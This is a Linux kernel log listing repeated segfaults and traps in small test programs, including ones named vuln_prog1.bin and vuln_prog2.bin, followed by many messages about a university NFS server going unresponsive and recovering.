[2511066.862737] b2i[3859]: segfault at 0 ip 00007fb625e331ba sp 00007ffd9820f500 error 4 in libc-2.23.so[7fb625dc5000+1c0000]
[2511070.706071] b2i[3867]: segfault at 0 ip 00007f3537cf91ba sp 00007ffca2c3b950 error 4 in libc-2.23.so[7f3537c8b000+1c0000]
[2511103.838547] b2i[3875]: segfault at 0 ip 00007fe8dc6781ba sp 00007ffcfd574ca0 error 4 in libc-2.23.so[7fe8dc60a000+1c0000]
[2511107.581780] b2i[3885]: segfault at 0 ip 00007f8e8d1a31ba sp 00007fff6f31a5d0 error 4 in libc-2.23.so[7f8e8d135000+1c0000]
[2511126.909996] b2i[3918]: segfault at 0 ip 00007fa9ba1781ba sp 00007fff9e302ad0 error 4 in libc-2.23.so[7fa9ba10a000+1c0000]
[2511356.847782] b2i[4041]: segfault at 0 ip 00007f04aa0dd264 sp 00007fff2dd92380 error 4 in libc-2.23.so[7f04aa070000+1c0000]
[2511392.636650] b2i[4055]: segfault at 0 ip 00007fd42f0ea264 sp 00007ffcb9c1c680 error 4 in libc-2.23.so[7fd42f07d000+1c0000]
[2511483.223840] b2i[4079]: segfault at 0 ip 00007f3b772b4264 sp 00007ffeb8464e80 error 4 in libc-2.23.so[7f3b77247000+1c0000]
[2511508.532813] b2t[4096]: segfault at 0 ip 00007f005d5791ba sp 00007ffcb4e2ac90 error 4 in libc-2.23.so[7f005d50b000+1c0000]
[2521353.244198] text2bin[8277]: segfault at 100000 ip 00007fcbb819b6cc sp 00007ffe3bc2c2f8 error 4 in libc-2.23.so[7fcbb810d000+1c0000]
[2522080.617789] traps: text2bin[8647] general protection ip:7fadc215781d sp:7ffe900e52e0 error:0 in libc-2.23.so[7fadc211e000+1c0000]
[2522265.028395] traps: text2bin[8766] general protection ip:7f3b52fd281d sp:7ffc62cdeeb0 error:0 in libc-2.23.so[7f3b52f99000+1c0000]
[2522307.974032] traps: text2bin[8780] general protection ip:7f73cb14481d sp:7ffec1c42a60 error:0 in libc-2.23.so[7f73cb10b000+1c0000]
[2522348.322003] traps: text2bin[8800] general protection ip:7f44c367d81d sp:7ffc98b13a20 error:0 in libc-2.23.so[7f44c3644000+1c0000]
[2522603.157556] text2bin[8972]: segfault at 7fff5bffb000 ip 00007ff029a02729 sp 00007fff5bef8f78 error 7 in libc-2.23.so[7ff029974000+1c0000]
[2522641.657219] text2bin[9071]: segfault at 7ffe75a9a000 ip 00007f20e86996cc sp 00007ffe75997418 error 4 in libc-2.23.so[7f20e860b000+1c0000]
[2522762.237740] text2bin[9179]: segfault at 7ffd764aa000 ip 00007f0b71ce8703 sp 00007ffd763a8318 error 4 in libc-2.23.so[7f0b71c5a000+1c0000]
[2522804.669859] text2bin[9194]: segfault at 7fff6718e000 ip 00007f525bb7f703 sp 00007fff6708ca28 error 4 in libc-2.23.so[7f525baf1000+1c0000]
[2527431.763602] text2bin[11641]: segfault at 0 ip 00007f283ec61bf7 sp 00007ffd58bb4788 error 4 in libc-2.23.so[7f283ebbc000+1c0000]
[2545116.483518] text2bin[20707]: segfault at 0 ip 00007f6dceeb9c80 sp 00007fffc1d259e0 error 6 in libc-2.23.so[7f6dcee4b000+1c0000]
[2545119.463148] bin2text[20720]: segfault at 0 ip 00007f6b76fd1481 sp 00007ffe35c077a8 error 6 in libc-2.23.so[7f6b76f3d000+1c0000]
[2545355.879792] b2i[20938]: segfault at 0 ip 0000000000400af7 sp 00007ffc9afd1970 error 4 in b2i[400000+1000]
[2545378.544516] b2i[20955]: segfault at 0 ip 0000000000400af7 sp 00007ffce9742730 error 4 in b2i[400000+1000]
[2552714.931503] test[24560]: segfault at 7fbb6a81a184 ip 00007fbb6a804c80 sp 00007ffe2b7cbf80 error 7 in libc-2.23.so[7fbb6a796000+1c0000]
[2552883.729186] test[24596]: segfault at 7f237204d184 ip 00007f2372037c80 sp 00007fff544cf6c0 error 7 in libc-2.23.so[7f2371fc9000+1c0000]
[2554520.938713] test[25555]: segfault at 7ffc9f9a16bc ip 0000000000400791 sp 00007ffc9f9a16b0 error 6 in test[400000+1000]
[2554570.664536] text2bin[25674]: segfault at 0 ip 00007f251b8dac80 sp 00007fffc1feac50 error 6 in libc-2.23.so[7f251b86c000+1c0000]
[2554641.324672] test[25894]: segfault at 7fec0675a184 ip 00007fec06744c80 sp 00007ffd2740dd90 error 7 in libc-2.23.so[7fec066d6000+1c0000]
[2554734.086758] text2bin[25990]: segfault at 0 ip 00007fa221cd0c80 sp 00007ffd17305390 error 6 in libc-2.23.so[7fa221c62000+1c0000]
[2554761.178330] test[26007]: segfault at 7f300b483184 ip 00007f300b46dc80 sp 00007ffdbe725970 error 7 in libc-2.23.so[7f300b3ff000+1c0000]
[2555084.204379] test[26106]: segfault at 18 ip 00007f6aa1a39ff1 sp 00007ffe3e0081d0 error 4 in libc-2.23.so[7f6aa19ba000+1c0000]
[2555230.408063] test[26262]: segfault at 7fff3bdebc3c ip 0000000000400791 sp 00007fff3bdebc30 error 6 in test[400000+1000]
[2555273.938423] test[26276]: segfault at 7ffe8d959c9c ip 0000000000400791 sp 00007ffe8d959c90 error 6 in test[400000+1000]
[2555364.734136] test[26300]: segfault at 7fffaa07097c ip 0000000000400791 sp 00007fffaa070970 error 6 in test[400000+1000]
[2555367.715279] test[26308]: segfault at 7ffcc5a4f78c ip 0000000000400791 sp 00007ffcc5a4f780 error 6 in test[400000+1000]
[2555388.913577] test[26326]: segfault at 7fff4a10e5ec ip 0000000000400791 sp 00007fff4a10e5e0 error 6 in test[400000+1000]
[2555485.756644] test[26361]: segfault at 7ffee79460bc ip 0000000000400791 sp 00007ffee79460b0 error 6 in test[400000+1000]
[2555771.067236] test[26440]: segfault at 7ffbe717e9bc ip 0000000000400791 sp 00007ffbe717e9b0 error 6 in test[400000+1000]
[2555925.512734] test[26513]: segfault at 7ffe584753ac ip 0000000000400741 sp 00007ffe584753a0 error 6 in test[400000+1000]
[2555960.016596] test[26525]: segfault at 7ffc52a5ee9c ip 0000000000400741 sp 00007ffc52a5ee90 error 6 in test[400000+1000]
[2556145.834941] test[26721]: segfault at 7ffda3aba47c ip 0000000000400741 sp 00007ffda3aba470 error 6 in test[400000+1000]
[2556196.926099] test[26735]: segfault at 7ffd1580d2cc ip 0000000000400701 sp 00007ffd1580d2c0 error 6 in test[400000+1000]
[2556217.780669] test[26749]: segfault at 7ffca1722abc ip 0000000000400701 sp 00007ffca1722ab0 error 6 in test[400000+1000]
[2556237.463299] test[26759]: segfault at 7ffcd3729bbc ip 0000000000400701 sp 00007ffcd3729bb0 error 6 in test[400000+1000]
[2556536.975659] text2bin[26964]: segfault at 1 ip 00007fe7939ee676 sp 00007fff0a299400 error 4 in libc-2.23.so[7fe793973000+1c0000]
[2559143.982626] a.out[28686]: segfault at 0 ip 00007fe074214aee sp 00007ffd9dbd3fe0 error 4 in libc-2.23.so[7fe0741a7000+1c0000]
[2559258.774700] test[28749]: segfault at 18 ip 00007f3aca010ff1 sp 00007ffe84468db0 error 4 in libc-2.23.so[7f3ac9f91000+1c0000]
[2559357.331032] test[28825]: segfault at 0 ip 00007ff10ec1d532 sp 00007ffdbab6fc90 error 4 in libc-2.23.so[7ff10eb99000+1c0000]
[2559392.208482] test[28897]: segfault at 0 ip 00007fb0abd74532 sp 00007ffe3c9ad560 error 4 in libc-2.23.so[7fb0abcf0000+1c0000]
[2559504.272253] test[28984]: segfault at 18 ip 00007f7f1da1aff1 sp 00007ffc3bde7e20 error 4 in libc-2.23.so[7f7f1d99b000+1c0000]
[2559662.670122] a.out[29209]: segfault at 0 ip 00007f077644c264 sp 00007ffec67b9a10 error 4 in libc-2.23.so[7f07763df000+1c0000]
[2559732.270809] a.out[29244]: segfault at 0 ip 00007fca7bab1264 sp 00007ffead09c610 error 4 in libc-2.23.so[7fca7ba44000+1c0000]
[2559805.321972] a.out[29325]: segfault at 0 ip 00007fef8dfbc264 sp 00007ffdd8690140 error 4 in libc-2.23.so[7fef8df4f000+1c0000]
[2559862.963003] a.out[29359]: segfault at 0 ip 00007fcf58d5c264 sp 00007fffd9e2ca40 error 4 in libc-2.23.so[7fcf58cef000+1c0000]
[2559897.891413] test[29373]: segfault at 18 ip 00007ff0123b3ff1 sp 00007ffdccc25a90 error 4 in libc-2.23.so[7ff012334000+1c0000]
[2559920.596590] a.out[29388]: segfault at 0 ip 00007fe784f86264 sp 00007ffc66233c00 error 4 in libc-2.23.so[7fe784f19000+1c0000]
[2559931.829886] test[29393]: segfault at 18 ip 00007fba95767ff1 sp 00007fff5a0036e0 error 4 in libc-2.23.so[7fba956e8000+1c0000]
[2559950.465067] a.out[29413]: segfault at 0 ip 00007ffbd76ef264 sp 00007ffe9ec17d00 error 4 in libc-2.23.so[7ffbd7682000+1c0000]
[2559975.255168] test[29420]: segfault at 18 ip 00007f1d80732ff1 sp 00007ffc10809fb0 error 4 in libc-2.23.so[7f1d806b3000+1c0000]
[2560014.635032] a.out[29489]: segfault at 0 ip 00007ff052c90264 sp 00007ffd20faff70 error 4 in libc-2.23.so[7ff052c23000+1c0000]
[2560200.320406] a.out[29626]: segfault at 0 ip 00000000004009e4 sp 00007ffff9299d50 error 4 in a.out[400000+1000]
[2560262.984220] a.out[29660]: segfault at 0 ip 0000000000400a4d sp 00007fff2887fa90 error 4 in a.out[400000+1000]
[2560306.576157] test[29683]: segfault at 18 ip 00007efccf450ff1 sp 00007ffe394724b0 error 4 in libc-2.23.so[7efccf3d1000+1c0000]
[2560371.656778] a.out[29721]: segfault at 0 ip 00007fbc202c2264 sp 00007ffc7b456fd0 error 4 in libc-2.23.so[7fbc20255000+1c0000]
[2560384.970689] test[29731]: segfault at 18 ip 00007fe19483aff1 sp 00007ffed2377270 error 4 in libc-2.23.so[7fe1947bb000+1c0000]
[2560422.166865] a.out[29752]: segfault at 0 ip 00007f5944d08264 sp 00007ffe0dafcc50 error 4 in libc-2.23.so[7f5944c9b000+1c0000]
[2560470.541680] a.out[29766]: segfault at 0 ip 00007f9c8ff85264 sp 00007ffd7df7f4a0 error 4 in libc-2.23.so[7f9c8ff18000+1c0000]
[2560498.859820] a.out[29789]: segfault at 0 ip 00007f885dc3c264 sp 00007ffc3fb99250 error 4 in libc-2.23.so[7f885dbcf000+1c0000]
[2560581.318592] a.out[29814]: segfault at 0 ip 00007f9c33393264 sp 00007ffec8809e30 error 4 in libc-2.23.so[7f9c33326000+1c0000]
[2560583.030300] test[29818]: segfault at 18 ip 00007f8666729ff1 sp 00007fff4c1bb5a0 error 4 in libc-2.23.so[7f86666aa000+1c0000]
[2560635.472439] a.out[29833]: segfault at 0 ip 00007fd463a24264 sp 00007fff5a2bc4d0 error 4 in libc-2.23.so[7fd4639b7000+1c0000]
[2560666.237796] test[29850]: segfault at 18 ip 00007f4d64a2bff1 sp 00007ffe008ac260 error 4 in libc-2.23.so[7f4d649ac000+1c0000]
[2560753.693582] a.out[29879]: segfault at 0 ip 00007f9bef50f264 sp 00007ffdd2331de0 error 4 in libc-2.23.so[7f9bef4a2000+1c0000]
[2560795.757068] test[29907]: segfault at 18 ip 00007f24039d1ff1 sp 00007ffeeed0d1d0 error 4 in libc-2.23.so[7f2403952000+1c0000]
[2560802.662569] a.out[29916]: segfault at 0 ip 00007f945eec6264 sp 00007fff7b692f20 error 4 in libc-2.23.so[7f945ee59000+1c0000]
[2560837.992049] test[29931]: segfault at 18 ip 00007f108406fff1 sp 00007ffc03a8ced0 error 4 in libc-2.23.so[7f1083ff0000+1c0000]
[2560844.247291] test[29943]: segfault at 18 ip 00007f7d4669eff1 sp 00007ffee3b71c70 error 4 in libc-2.23.so[7f7d4661f000+1c0000]
[2560846.556112] test[29945]: segfault at 18 ip 00007f6b35ebaff1 sp 00007ffcbf6a40d0 error 4 in libc-2.23.so[7f6b35e3b000+1c0000]
[2560875.707611] a.out[29966]: segfault at 0 ip 00007f3f08754264 sp 00007ffe0f2720a0 error 4 in libc-2.23.so[7f3f086e7000+1c0000]
[2560908.685687] a.out[29980]: segfault at 0 ip 00007f8b56622264 sp 00007ffed3023740 error 4 in libc-2.23.so[7f8b565b5000+1c0000]
[2560971.627319] test[30022]: segfault at 0 ip 00007fb5b0b73532 sp 00007fff51fdc010 error 4 in libc-2.23.so[7fb5b0aef000+1c0000]
[2560998.833381] test[30040]: segfault at 0 ip 00007f15f7fb6532 sp 00007ffc5fee6e50 error 4 in libc-2.23.so[7f15f7f32000+1c0000]
[2561017.341588] test[30056]: segfault at 0 ip 00007fe340e63532 sp 00007ffe3601fd90 error 4 in libc-2.23.so[7fe340ddf000+1c0000]
[2561034.312805] a.out[30070]: segfault at 0 ip 00007feec8891264 sp 00007ffd8acfcc10 error 4 in libc-2.23.so[7feec8824000+1c0000]
[2561097.826353] a.out[30167]: segfault at 0 ip 00007fa15b6106f8 sp 00007ffc79f32ac0 error 4 in libc-2.23.so[7fa15b5a2000+1c0000]
[2561118.467199] test[30177]: segfault at 18 ip 00007f5e9c2b8ff1 sp 00007ffc7a4ea8a0 error 4 in libc-2.23.so[7f5e9c239000+1c0000]
[2561131.619505] a.out[30194]: segfault at 0 ip 00007f0aa1f56264 sp 00007fff62dbd360 error 4 in libc-2.23.so[7f0aa1ee9000+1c0000]
[2561312.634803] test[30271]: segfault at 18 ip 00007efd254f1ff1 sp 00007fffb8d7e660 error 4 in libc-2.23.so[7efd25472000+1c0000]
[2561331.668532] test[30294]: segfault at 18 ip 00007f6ac3867ff1 sp 00007ffea6a26a50 error 4 in libc-2.23.so[7f6ac37e8000+1c0000]
[2561424.945205] test[30508]: segfault at 18 ip 00007f161ec84ff1 sp 00007ffcb9adfbf0 error 4 in libc-2.23.so[7f161ec05000+1c0000]
[2561465.767153] test[30530]: segfault at 18 ip 00007f3cb5424ff1 sp 00007ffc1e9caf60 error 4 in libc-2.23.so[7f3cb53a5000+1c0000]
[2561469.737833] test[30539]: segfault at 18 ip 00007efe65be8ff1 sp 00007ffffbef0ea0 error 4 in libc-2.23.so[7efe65b69000+1c0000]
[2561700.796118] test[30713]: segfault at 18 ip 00007f39df64dff1 sp 00007ffd5fc48eb0 error 4 in libc-2.23.so[7f39df5ce000+1c0000]
[2561791.410463] test[30768]: segfault at 18 ip 00007fd87e30bff1 sp 00007fff5cce09e0 error 4 in libc-2.23.so[7fd87e28c000+1c0000]
[2561916.661051] test[30836]: segfault at 18 ip 00007fab2275fff1 sp 00007fff4bc70cc0 error 4 in libc-2.23.so[7fab226e0000+1c0000]
[2562014.630800] test[30908]: segfault at 18 ip 00007f25335a5ff1 sp 00007ffe84a86ad0 error 4 in libc-2.23.so[7f2533526000+1c0000]
[2562107.358979] test[30999]: segfault at 18 ip 00007f7bbdf69ff1 sp 00007ffd274d3240 error 4 in libc-2.23.so[7f7bbdeea000+1c0000]
[2563227.916702] test[31788]: segfault at c8 ip 0000000000400b5f sp 00007ffc5d633ed0 error 6 in test[400000+1000]
[2596582.014826] t2b[9734]: segfault at 0 ip 00007f9cb9530454 sp 00007ffc8b46b0e0 error 4 in libc-2.23.so[7f9cb94f5000+1c0000]
[2597338.958167] test[10200]: segfault at 0 ip 00007fbf019e3746 sp 00007ffd9ccf1268 error 4 in libc-2.23.so[7fbf01958000+1c0000]
[2597561.723170] b2i[10620]: segfault at 0 ip 00007f1d54e6d1ba sp 00007ffff6537f40 error 4 in libc-2.23.so[7f1d54dff000+1c0000]
[2597586.679744] b2i[10700]: segfault at 0 ip 00007ff0346ad1ba sp 00007fff02f1c960 error 4 in libc-2.23.so[7ff03463f000+1c0000]
[2597595.803973] b2i[10704]: segfault at 0 ip 00007fe3b99fd1ba sp 00007fff5d21fb30 error 4 in libc-2.23.so[7fe3b998f000+1c0000]
[2597628.285018] test[10720]: segfault at 0 ip 00000000004009f9 sp 00007ffdefc4a0f0 error 4 in test[400000+1000]
[2597684.881525] b2i[10806]: segfault at 0 ip 00007fc06433e1ba sp 00007fffa3c47190 error 4 in libc-2.23.so[7fc0642d0000+1c0000]
[2603578.258234] vuln_prog1.bin[14193]: segfault at 1 ip 00007fffffffd290 sp 00007fffffffdb30 error 6
[2603578.431177] vuln_prog2.bin[14206]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2603578.597846] vuln_prog1.bin[14219]: segfault at 1 ip 00007fffffffd290 sp 00007fffffffdb30 error 6
[2603655.015196] vuln_prog1.bin[14285]: segfault at 1 ip 00007fffffffd290 sp 00007fffffffdb30 error 6
[2603655.195037] vuln_prog2.bin[14298]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2603655.359725] vuln_prog1.bin[14311]: segfault at 1 ip 00007fffffffd290 sp 00007fffffffdb30 error 6
[2604867.779942] traps: vuln_prog1.bin[14873] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2604867.962304] vuln_prog2.bin[14886]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2604868.126257] traps: vuln_prog1.bin[14899] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2604940.309525] vuln_prog2.bin[14999]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2604940.491123] traps: vuln_prog1.bin[15012] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2604962.831340] vuln_prog2.bin[15062]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2604963.009926] traps: vuln_prog1.bin[15075] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2605026.710046] vuln_prog2.bin[15138]: segfault at 12 ip 00007fffffffd3f0 sp 00007fffffffdd40 error 6
[2605388.428638] bin2indexed[15587]: segfault at 0 ip 00007ff5e2eccaee sp 00007ffed006c290 error 4 in libc-2.23.so[7ff5e2e5f000+1c0000]
[2605392.560996] vuln_prog2.bin[15625]: segfault at 7fffff7feff0 ip 0000555555554a8d sp 00007fffff7feff8 error 6 in vuln_prog2.bin[555555554000+1000]
[2605401.859022] bin2indexed[15644]: segfault at 0 ip 00007f34eb839aee sp 00007ffec7452e30 error 4 in libc-2.23.so[7f34eb7cc000+1c0000]
[2605407.246714] vuln_prog2.bin[15685]: segfault at 0 ip 00007fffffffdd00 sp 00007fffffffdd40 error 6
[2605730.823880] traps: vuln_prog1.bin[16062] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2605731.004025] vuln_prog2.bin[16075]: segfault at 0 ip 00007fffffffdd00 sp 00007fffffffdd40 error 6
[2605731.173937] traps: vuln_prog1.bin[16088] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2605760.454724] traps: vuln_prog1.bin[16132] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2605760.651964] traps: vuln_prog1.bin[16151] trap invalid opcode ip:7fffffffdb8b sp:7fffffffdb30 error:0
[2613184.882355] a.out[19790]: segfault at 0 ip 0000000000400a41 sp 00007ffca07016b0 error 6 in a.out[400000+1000]
[2613233.377128] a.out[19820]: segfault at 0 ip 0000000000400b1a sp 00007ffd662c4b30 error 6 in a.out[400000+1000]
[2613288.861852] a.out[19844]: segfault at 0 ip 0000000000400b1a sp 00007fff53209ff0 error 6 in a.out[400000+1000]
[2613338.437913] a.out[19869]: segfault at 0 ip 0000000000400b1a sp 00007fffd41c2ae0 error 6 in a.out[400000+1000]
[2613395.310488] a.out[19891]: segfault at 0 ip 0000000000400b1a sp 00007ffd89f2f4d0 error 6 in a.out[400000+1000]
[2613462.076288] a.out[19916]: segfault at 0 ip 0000000000400a4a sp 00007ffed5f7d280 error 6 in a.out[400000+1000]
[2613516.713573] a.out[19942]: segfault at 0 ip 0000000000400b23 sp 00007ffe412f1e20 error 6 in a.out[400000+2000]
[2613574.744965] a.out[19958]: segfault at 0 ip 0000000000400a22 sp 00007ffd5c393500 error 6 in a.out[400000+1000]
[2613627.071525] a.out[20129]: segfault at 0 ip 0000000000400afb sp 00007fff9427fb00 error 6 in a.out[400000+2000]
[2614591.361949] traps: a.out[20661] general protection ip:7ff17fdebef2 sp:7ffd70228dd0 error:0 in libc-2.23.so[7ff17fd6c000+1c0000]
[2617694.935290] b2i[22588]: segfault at 7febb9565ec0 ip 00007febb90983ef sp 00007ffd0bf1a0b8 error 4 in libc-2.23.so[7febb9009000+1c0000]
[2618906.386708] passwd[23794]: segfault at ffff ip 0000000000400094 sp 00007ffc1c493df0 error 4 in passwd[400000+1000]
[2619202.099932] a.out[24404]: segfault at b43000 ip 00007f9b54374f45 sp 00007ffde7d74a70 error 4 in libc-2.23.so[7f9b542f5000+1c0000]
[2619368.647137] passwd[24511]: segfault at 7ffe13725040 ip 00000000004000ad sp 00007ffe13725010 error 4 in passwd[400000+1000]
[2619640.262289] passwd[24649]: segfault at 7ffbc7cc3300 ip 00000000004000b0 sp 00007ffbc7cc32d0 error 4 in passwd[400000+1000]
[2619848.219020] text2bin[25106]: segfault at 3 ip 00007f591ad723bb sp 00007ffc051286e8 error 4 in libc-2.23.so[7f591ace3000+1c0000]
[2621725.019914] t2b[26610]: segfault at 0 ip 00007f00979a7454 sp 00007ffec9f7a660 error 4 in libc-2.23.so[7f009796c000+1c0000]
[2621821.110395] bin2text[26632]: segfault at c4 ip 00007fba75183cc0 sp 00007ffdb3546250 error 4 in libc-2.23.so[7fba75135000+1c0000]
[2621948.971369] b2i[26845]: segfault at cd1b88 ip 00000000004009bf sp 00007fffe780e4f0 error 4 in b2i[400000+1000]
[2622064.682834] b2i[26928]: segfault at 2541b88 ip 00000000004009bf sp 00007fff76a12890 error 4 in b2i[400000+1000]
[2622348.028679] bin2text[27168]: segfault at c4 ip 00007ff2d35b1cc0 sp 00007ffe9c6b1f50 error 4 in libc-2.23.so[7ff2d3563000+1c0000]
[2624766.309597] vuln_prog1.bin[28849]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffe9c991580 error 14 in vuln_prog1.bin[55b0d99b1000+1000]
[2630028.242992] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630042.226808] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630347.387747] nfs: server vader.srcit.stevens-tech.edu OK
[2630410.517895] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630527.404388] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630590.703506] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630642.826827] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630713.065861] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630736.073580] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630833.569758] nfs: server vader.srcit.stevens-tech.edu OK
[2630833.571205] nfs: server vader.srcit.stevens-tech.edu OK
[2630833.582275] nfs: server vader.srcit.stevens-tech.edu OK
[2630833.595025] nfs: server vader.srcit.stevens-tech.edu OK
[2630971.206529] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2630983.974221] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631055.013357] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631287.906285] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945523] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945587] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945603] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945618] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945632] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945652] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945653] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.945668] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.949470] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.949476] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631345.949526] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631368.065204] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631404.160699] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631469.579873] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2631542.974871] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2632709.295569] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2632714.431533] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2633081.426613] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2633130.606095] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2633198.921153] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2633320.151551] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2633398.814541] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634002.470181] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634037.757723] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634061.821434] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634063.773396] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634131.484462] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634362.009283] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634457.016006] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634542.054754] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634551.934659] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634627.093611] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634721.116315] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634851.346622] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2634936.325513] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635058.299866] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635143.246756] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635243.709423] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635278.428969] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635427.963021] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635438.546853] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635512.777820] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635597.740724] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635702.223311] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635806.629947] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635891.616833] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2635976.515680] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2636061.418559] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2637471.911352] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2637504.670958] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2637504.678914] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2639064.202102] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2639129.221047] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2639455.948762] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2644551.246720] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2676605.103312] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2677286.106297] nfs: server vader.srcit.stevens-tech.edu not responding, still trying
[2679630.141355] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.141603] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.141634] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144243] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144279] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144293] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144305] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144318] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144340] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144352] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144364] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144376] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144388] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144399] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144412] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144424] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.144909] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.145116] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.145324] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.145339] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.145353] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.145566] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.146120] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.147087] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.147112] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.147966] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.148799] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.149686] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.150567] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.150942] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.152194] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.153539] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.154589] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.154738] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.155734] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.156995] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.157859] nfs: server vader.srcit.stevens-tech.edu OK
[2679630.158000] nfs: server vader.srcit.stevens-tech.edu OK
